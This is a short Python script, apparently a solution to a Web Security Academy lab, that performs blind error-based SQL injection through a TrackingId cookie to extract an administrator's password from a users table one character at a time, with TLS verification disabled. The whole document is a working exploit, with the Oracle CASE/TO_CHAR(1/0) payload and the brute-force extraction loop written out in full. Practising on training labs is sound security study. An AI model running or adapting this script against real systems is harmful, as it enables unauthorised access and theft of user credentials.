# copied from rana khalil's github

import sys
import requests
import urllib3 
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'cH4DIhJV6yDadCQ7' + sqli_payload_encoded, 'session': 'Zwf4vhaPgDCNBS3IypH5AbhoZWRvZh4V'}
            r = requests.get(url, cookies=cookies, verify=False)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    url = "https://0ade003e0488b745833a83f700110016.web-security-academy.net"
    sqli_password(url)

if __name__ == "__main__":
    main()
